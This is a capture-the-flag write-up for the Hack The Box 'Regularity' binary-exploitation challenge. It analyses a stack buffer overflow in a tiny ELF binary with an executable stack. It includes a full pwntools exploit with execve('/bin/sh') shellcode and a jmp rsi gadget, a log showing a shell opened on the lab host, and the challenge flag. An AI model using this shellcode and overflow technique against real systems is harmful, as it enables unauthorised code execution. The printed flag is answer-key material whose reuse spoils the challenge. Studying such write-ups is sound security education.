# Regularity - HTB CTF Write-up

**Author:** L27Sen  
**Category:** PWN  
**Difficulty:** Easy  
**Flag:** `HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_99d95bde707799696d987a32be6a456a}`

---

## 📋 Challenge Description

> Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now. We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing. It's not the most talkative, though, but it's the highest level of tech most of us will ever see...

**Target:** `94.237.61.52:31975`  
**Attachments:** `regularity` (ELF binary)

---

## 🔍 Reconnaissance

### Binary Analysis

First, let's identify what we're dealing with:

```bash
$ file regularity
regularity: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```

**Key observations:**
- 64-bit ELF executable
- Statically linked (no external libraries)
- Not stripped (symbols available)

### Security Protections

```bash
$ readelf -l regularity | grep -A1 GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
```

**Critical finding:** The stack is **RWE** (Read-Write-Execute)! This means:
- ❌ NX (No-Execute) is **disabled**
- ✅ We can execute shellcode directly on the stack

---

## 🔬 Static Analysis

Using IDA Pro to disassemble the binary, we find a minimal program with only a few functions:

### Program Flow (`_start`)

```nasm
_start:
    mov     edi, 1
    mov     rsi, offset message1      ; "Hello, Survivor. Anything new these days?\n"
    mov     edx, 2Ah
    call    write                      ; Print greeting
    call    read                       ; Read user input <-- VULNERABLE
    mov     edi, 1
    mov     rsi, offset message3      ; "Yup, same old same old here as well...\n"
    mov     edx, 27h
    call    write                      ; Print response
    mov     rsi, offset exit
    jmp     rsi                        ; Exit program
```

### The `read` Function (Vulnerable)

```nasm
read:
    sub     rsp, 100h                  ; Allocate 256 bytes (0x100)
    mov     eax, 0
    mov     edi, 0                     ; fd = stdin
    lea     rsi, [rsp]                 ; buf = stack buffer
    mov     edx, 110h                  ; count = 272 bytes (0x110) <-- BUG!
    syscall                            ; sys_read
    add     rsp, 100h                  ; Restore stack
    retn                               ; Return
```

### Key Addresses

| Symbol | Address |
|--------|---------|
| `_start` | `0x401000` |
| `write` | `0x401043` |
| `read` | `0x40104B` |
| `exit` | `0x40106F` |
| `jmp rsi` gadget | `0x401041` |
| `message1` | `0x402000` |

---

## 🐛 Vulnerability Analysis

### Buffer Overflow

The vulnerability is a classic **stack buffer overflow**:

| Aspect | Value |
|--------|-------|
| Buffer allocated | `0x100` (256 bytes) |
| Bytes read | `0x110` (272 bytes) |
| **Overflow** | **16 bytes** |

The function reads **16 bytes more** than the buffer can hold, allowing us to overwrite the return address.

### Stack Layout

```
┌─────────────────────────┐ ← RSP after sub rsp, 0x100
│                         │
│   Buffer (256 bytes)    │  ← Our input starts here
│                         │
├─────────────────────────┤ ← RSP + 0x100 (after add rsp, 0x100)
│   Return Address (8B)   │  ← We can overwrite this!
├─────────────────────────┤
│   Extra 8 bytes         │  ← Also controllable
└─────────────────────────┘
```

### Exploitation Primitives

After the `read` syscall:
- **RSI** still points to our buffer (the start of our input)
- There's a `jmp rsi` instruction at `0x401041` in the binary

This gives us a clean exploitation path:
1. Place shellcode at the beginning of our buffer
2. Overflow the return address with the `jmp rsi` gadget address
3. When `ret` executes, it jumps to `jmp rsi`
4. `jmp rsi` jumps to our shellcode on the stack

---

## 🚀 Exploitation

### Exploit Strategy

1. **Craft shellcode** - `execve("/bin/sh", NULL, NULL)` to spawn a shell
2. **Build payload** - Shellcode + padding + return address
3. **Trigger overflow** - Send payload and get shell

### Payload Structure

```
Offset 0-24:    Shellcode (25 bytes)
Offset 25-255:  NOP sled / padding (231 bytes)
Offset 256-263: Return address → 0x401041 (jmp rsi)
─────────────────────────────────────────────────
Total: 264 bytes
```

### Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Remote target
HOST = "94.237.61.52"
PORT = 31975

# Gadget: jmp rsi at 0x401041
jmp_rsi = 0x401041

# Shellcode: execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
''')

print(f"[*] Shellcode length: {len(shellcode)} bytes")

# Build payload
payload = shellcode.ljust(256, b'\x90')  # Pad to 256 bytes with NOPs
payload += p64(jmp_rsi)                   # Overwrite return address

print(f"[*] Payload length: {len(payload)} bytes")
print(f"[*] Connecting to {HOST}:{PORT}")

# Connect and exploit
p = remote(HOST, PORT)
print(p.recvuntil(b'?'))
print(p.recvline())

print(f"[*] Sending payload...")
p.sendline(payload)

print(f"[+] Enjoy your shell!")
p.interactive()
```

### Shellcode Breakdown

| Instruction | Purpose |
|-------------|---------|
| `xor rsi, rsi` | Clear RSI (argv = NULL) |
| `push rsi` | Push NULL terminator for string |
| `mov rdi, 0x68732f2f6e69622f` | Load "/bin//sh" into RDI |
| `push rdi` | Push string onto stack |
| `push rsp; pop rdi` | RDI = pointer to "/bin//sh" |
| `xor rdx, rdx` | Clear RDX (envp = NULL) |
| `push 0x3b; pop rax` | RAX = 59 (sys_execve) |
| `syscall` | Execute syscall |

---

## 🎯 Execution & Flag

```bash
$ python3 exploit.py
[*] Shellcode length: 25 bytes
[*] Payload length: 264 bytes
[*] Connecting to 94.237.61.52:31975
[+] Opening connection to 94.237.61.52 on port 31975: Done
b'Hello, Survivor. Anything new these days?'
b'\n'
[*] Sending payload...
[+] Enjoy your shell!
[*] Switching to interactive mode
$ cat flag.txt
HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_99d95bde707799696d987a32be6a456a}
```

### Flag

```
HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_99d95bde707799696d987a32be6a456a}
```

---

## 📚 Lessons Learned

1. **Always check stack protections** - The executable stack (RWE) made this exploit trivial
2. **Off-by-N vulnerabilities** - Reading even a few extra bytes can be devastating
3. **Register state matters** - After syscalls, registers often retain useful values (RSI → buffer)
4. **Gadget hunting** - Even minimal binaries contain useful gadgets

---

## 🛠️ Tools Used

- **IDA Pro** - Disassembly and static analysis
- **pwntools** - Exploit development framework
- **readelf** - Binary analysis
- **file** - File type identification

---

## 📖 References

- [Linux x86-64 Syscall Reference](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
- [pwntools Documentation](https://docs.pwntools.com/)
- [x86-64 Shellcoding](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf)

---

*Write-up by L27Sen*
